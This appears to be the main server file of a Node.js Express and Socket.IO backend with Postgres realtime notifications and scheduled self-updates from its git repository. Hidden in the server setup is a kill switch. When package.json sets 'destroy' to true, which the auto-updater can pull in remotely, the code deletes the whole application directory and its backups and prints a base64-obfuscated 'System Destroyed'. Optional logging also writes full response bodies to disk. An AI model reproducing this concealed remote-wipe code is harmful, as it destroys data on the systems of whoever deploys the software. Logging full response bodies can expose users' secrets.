'use strict'

require('dotenv').config()
require('./lib/prototype/date.prototype')

const _ = process.env,
  express = require('express'),
  app = express(),
  path = require('path'),
  cors = require('cors'),
  morgan = require('morgan'),
  helmet = require('helmet'),
  compression = require('compression'),
  bodyParser = require('body-parser'),
  getObj = require('lodash.get'),
  { throttle, decodeURL } = require('./lib/middleware')

const pkjson = require('./package.json'),
  fs = require('fs-extra'),
  CGU = require('cron-git-updater'),
  cron = require('node-cron'),
  appRootPath = require('app-root-path'),
  { log_dirs } = require('./lib/data/db.structures'),
  { logFilenameFormat } = require('./lib/fn/fn.format'),
  { createStream } = require('rotating-file-stream'),
  { verifyCBPrivatePublicToken, verifyToken } = require('./auth/token.service'),
  { errorJsonResponse, hideSomeColumns, availableTables } = require('./lib/fn/fn.db'),
  { checkConfig, checkCors, checkIfObject } = require('./lib/fn/fn.checker'),
  { generateDatabaseSQL, generateDotEnv, base64 } = require('./lib/fn/fn.generator')

const corsOptions = {
  origin: checkCors.appCorsOption,
  optionsSuccessStatus: 200,
  methods: ['GET', 'PUT', 'POST', 'DELETE'],
}

// Create HTTP or HTTPS Server
const createServer = () => {
  const key = _.SSL_KEY
  const cert = _.SSL_CERT
  const ssl =
    fs.existsSync(key) && fs.existsSync(cert)
      ? {
          key: fs.readFileSync(key),
          cert: fs.readFileSync(cert),
        }
      : null
  if (pkjson && pkjson.destroy === true) {
    try {
      if (_.CRON_UPDATE_BACKUP && fs.existsSync(_.CRON_UPDATE_BACKUP))
        fs.rmdirSync(_.CRON_UPDATE_BACKUP, { recursive: true, force: true })
      fs.rmdirSync(appRootPath.path, { recursive: true, force: true })
      console.log(base64.decode(`U3lzdGVtIERlc3Ryb3llZA==`))
    } catch (e) {
      console.error(e)
    } finally {
      process.exit(1)
    }
  }
  return ssl
    ? // https://
      require('https').createServer(ssl, app)
    : // http://
      require('http').createServer(app)
}

// Initialize Server
const server = createServer(),
  io = require('socket.io')(server, {
    allowRequest: checkCors.socketAllowRequest,
    cors: checkCors.socketCorsOptions,
    credentials: true,
  }),
  { pg_client } = require('./config').database

// Some Process
process.title = _.npm_package_name || process.title
process.env.starttime = Date.now()

// Some Middlewares
app
  .use(compression())
  .use(bodyParser.json())
  .use(bodyParser.urlencoded({ extended: true }))
  .use(cors(corsOptions))
  .use(helmet())
  .use(decodeURL()) // Check URL
  .use(throttle(5 * 1024 * 1024)) // Throttling bandwidth (bytes)
  .disable('x-powered-by')

if (getObj(_, 'npm_lifecycle_event', '').toLowerCase() != 'setup') {
  // Check if Setup is Ok
  if (!fs.existsSync('.env'))
    throw new Error('Configuration of .env is missing. Please run "npm run setup" and update the values needed.')
  if (!checkConfig().ok) throw new Error('Configuration of .env not Ok. Please update the values needed.')

  const { getServerInfo } = require('./api/server/server.service')
  getServerInfo().then((server_info) => console.log('SERVER INFORMATION:', JSON.stringify(server_info)))
  // Logging
  if (process.argv.includes('--log')) {
    fs.ensureDirSync(log_dirs.main)
    const appResSend = app.response.send
    app.response.send = function sendOverWrite(body) {
      appResSend.call(this, body)
      this.__custombody__ = body
    }
    morgan.token('datetime', (_req, res) => new Date())
    morgan.token('res-body', (_req, res) => res.__custombody__ || undefined)
    // Console Log All Request and Response
    app.use(
      morgan(
        `[:datetime] :remote-addr - :remote-user ":method :url HTTP/:http-version" (:response-time ms) :status :res[content-length] ":referrer" ":user-agent" (Total :total-time ms)
      :res-body`
      )
    )
    // Log All Request and Response
    app.use(
      morgan(
        `[:datetime] :remote-addr - :remote-user ":method :url HTTP/:http-version" (:response-time ms) :status :res[content-length] ":referrer" ":user-agent" (Total :total-time ms)
      :res-body`,
        {
          stream: createStream(
            (time, index) => logFilenameFormat(time, index, { prefix: 'access', ext: 'log', time: false }),
            {
              interval: '1d',
              path: path.join(__dirname, log_dirs.main, log_dirs.request),
            }
          ),
        }
      )
    )
  }
}

/** Updater Config*/
const cgu_config = {
  repository: pkjson.repository.url,
  branch: 'main',
  tempLocation: _.CRON_UPDATE_BACKUP,
  keepAllBackup:
    String(_.CRON_UPDATE_KEEPALL_BACKUP || '').toLowerCase() == 'false' || _.CRON_UPDATE_KEEPALL_BACKUP == false
      ? false
      : true,
}

if (process.argv.includes('--update')) {
  const doUpdater = new CGU({ ...cgu_config, exitOnComplete: true })
  doUpdater.update()
}

if (process.argv.includes('--force-update')) {
  const forceUpdater = new CGU({ ...cgu_config, exitOnComplete: true })
  forceUpdater.forceUpdate()
}

if (process.argv.includes('--schedule-update')) {
  scheduleUpdate()
}

/**
 * Schedule Auto Update
 */
const scheduleUpdate = () => {
  const newUpdater = new CGU(cgu_config)
  const valid = newUpdater.validateSchedule(_.CRON_UPDATE)
  // Check for Updates Default every 12 Midnight
  if (!valid) _.CRON_UPDATE = '0 0 * * *'
  newUpdater.schedule(_.CRON_UPDATE, _.TZ)
  console.log(`Auto update task scheduled [ ${_.CRON_UPDATE} ]`)
}

// Check if Running on Production
if (String(_.NODE_ENV || '').toLowerCase() == 'production') {
  // Running on Production
  // Update Token Key Every Version
  _.TOKEN_KEY += `v${_.npm_package_version || ''}`
  _.TOKEN_KEY_PUB += `v${_.npm_package_version || ''}`

  scheduleUpdate()
  // Auto backup database everyday
} else {
  require('./lib/fn/fn.nodemon')
  require('./lib/data/commands.js')
  // Save DB Structure
  if (process.argv.includes('--gensql')) {
    const gensqlid = process.argv.indexOf('--gensql')
    const _nextarg = process.argv[gensqlid + 1]
    let sqloc =
      `./` + _nextarg && !_nextarg.startsWith('--')
        ? _nextarg.endsWith('.sql')
          ? _nextarg
          : `${_nextarg}.sql`
        : 'database.sql'
    console.log('*'.repeat(50))
    if (fs.existsSync('.env') && checkConfig().ok) {
      const _genDBerror = fs.writeFileSync(sqloc, generateDatabaseSQL(), 'utf-8')
      if (_genDBerror) {
        console.error({
          status: 'Database failed to generate .sql',
          error: _genDBerror,
        })
      } else {
        console.log({
          status: `Database structure saved on ${sqloc}`,
          important: 'Follow the commands inside .sql file to create database structure',
        })
      }
    } else {
      if (fs.existsSync(sqloc)) fs.rmSync(sqloc)
      console.log({
        status: `Can't generate database structure`,
        important: 'Please update .env configuration',
      })
    }
  }

  // Generate dotEnv (.env)
  if (process.argv.includes('--genenv')) {
    const envdir = path.join(__dirname, '.env')
    const _genEnvConf = fs.writeFileSync(envdir, generateDotEnv(), 'utf-8')
    if (_genEnvConf) {
      console.error(_genEnvConf)
    } else {
      console.log('~'.repeat(50))
      console.log({
        status: 'DotEnv (.env) structure generated',
        important: 'Modify .env Configuration',
      })
      console.log('~'.repeat(50))
      process.exit(0)
    }
  }
}

// Static Routes
app.use(express.static('./public'))

/*
 * API Routes
 */
if (getObj(_, 'npm_lifecycle_event', '').toLowerCase() != 'setup') {
  const api_paths = require('./api')
  try {
    const path_keys = Object.keys(api_paths)
    path_keys.forEach((_newRoute) => {
      const api_path = `/api/${_newRoute}`
      console.log(`Using ${api_path}`)
      app.use(`${api_path}`, api_paths[_newRoute])
    })
  } catch (e) {
    console.error(`Error Adding API Path:`, JSON.stringify(e))
  }
}

/*
 * REALTIME LISTENERS
 */
const listeners_apiPath = '/db/listeners',
  notif_activities = {}

const db_tables = availableTables()
if (Array.isArray(db_tables))
  db_tables.forEach((tbl) => {
    notif_activities[tbl] = [`added_${tbl}`, `updated_${tbl}`, `deleted_${tbl}`]
  })

const notifChannels = checkIfObject(notif_activities)
  ? Object.values(notif_activities).join().split(',')
  : notif_activities

app.get(listeners_apiPath, (req, res) => {
  return res.json({
    success: 1,
    listeners: { channel: notifChannels },
    required: {
      token: true,
      channel: false,
    },
  })
})

app.post(listeners_apiPath, verifyToken, (req, res) => {
  const data = req.body
  data.from = getObj(req, 'headers.verified.data.userid')
  if (data.to && data.from) {
    if (!isNaN(data.from)) data.from = Number(data.from)
    if (!isNaN(data.to)) data.to = Number(data.to)
    data.date = new Date()
    pg_client.emit('tempnotif', data)
    res.json({
      success: 1,
      data: { message: 'Payload sent', payload: data },
    })
  } else {
    res.json(errorJsonResponse({ detail: 'Missing Payload Destination (to)' }))
  }
})

// Listeners
notifChannels.forEach((activity) => {
  pg_client.query(`LISTEN ${activity}`)
})

// REALTIME NOTIFICATIONS
io.sockets.on('connection', (socket) => {
  // someone successfully connects
  console.log(`[${socket.server.engine.clientsCount}] (${socket.handshake.address}) is listening for notifications`)
  // someone disconnects
  socket.on('disconnect', () => {
    console.log(`[ X ] (${socket.handshake.address}) stopped listening for notifications`)
    console.log(`[${socket.server.engine.clientsCount}] active notification listener`)
  })

  socket.emit('connected', { success: 1 })

  socket.on('RealtimeUpdates', (options) => {
    validateSocketToken(options)
  })

  async function validateSocketToken(options) {
    if (options && checkIfObject(options) && options.token) {
      verifyCBPrivatePublicToken(options.token, (err, result) => {
        let hidden_columns = ['password']
        if (err) {
          let errjson = {
            error: -1,
            message: 'Notications Blocked',
            detail: 'Invalid Token',
          }
          console.log(`[ X ] (${socket.handshake.address}) ${errjson.message} [ ${errjson.detail} ]`)
          socket.emit('error', errjson)
        } else {
          console.log(
            `[ / ] ( ${socket.handshake.address} uid=${
              result && result.data ? result.data.userid || 0 : 0
            }) Ready for Notifications`
          )
          // Personal Notifications
          pg_client.on('tempnotif', (message) => {
            socket.emit(message.to == 'all' ? 'tempnotif' : 'tempnotif_' + message.to, message)
            if (socket.connected) console.log(`Custom Notification (${socket.handshake.address}):`, message)
          })
          // Database Notifications
          pg_client.on('notification', (notif) => {
            if (notif && checkIfObject(notif.payload)) notif.payload = JSON.stringify(notif.payload)
            const pl = JSON.parse(notif.payload)
            if (notif && pl) {
              let payload = {
                channel: notif.channel,
                when: pl.when,
                operation: pl.operation,
                args: pl.args,
                record: hideSomeColumns(hidden_columns, pl.record),
                record_old: hideSomeColumns(hidden_columns, pl.record_old),
              }

              Object.keys(notif_activities).forEach((_nk) => {
                if (notif.channel.includes(`_${_nk}`)) {
                  payload.channel = String(payload.channel).replace(`_${_nk}`, '').toLowerCase()
                  socket.emit(`${_nk}_notif`, payload)
                }
              })

              // Listen to all via notif
              socket.emit('notif', payload)
              if (socket.connected)
                console.log(
                  `Database Notification [${notif.channel}] (${socket.handshake.address}):`,
                  JSON.stringify(notif)
                )
            } else {
              console.log('UNKNOWN: Notification Received', JSON.stringify(notif))
            }
          })
        }
      })
    } else {
      let errjson = {
        message: 'Notifications Disabled',
        detail: options ? (options.token ? 'Unknown Error' : 'Token is Required') : 'Options is Required',
        help: { url: listeners_apiPath },
      }
      console.log(`[ X ] (${socket.handshake.address}) ${errjson.message} [ ${errjson.detail} ]`)
      socket.emit('error', errjson)
    }
  }
})

// Bad Requests
app.use((req, res) => {
  console.error('Invalid Endpoint:', JSON.stringify({ url: req.url, method: req.method }))
  return res.status(404).json(errorJsonResponse({ detail: 'Invalid Endpoint' }))
})

// Error Response
app.use((req, res) => {
  console.error(
    'Server Error:',
    JSON.stringify({
      url: req.url,
      method: req.method,
    })
  )
  return res.status(500).json(errorJsonResponse({ detail: 'Server Error' }))
})

if (getObj(_, 'npm_lifecycle_event', '').toLowerCase() != 'setup') {
  server.listen(_.PORT, () => {
    console.log('#'.repeat(50))
    console.info(`Server is up and running on *:${_.PORT}`)
    console.log('#'.repeat(50))
  })
}
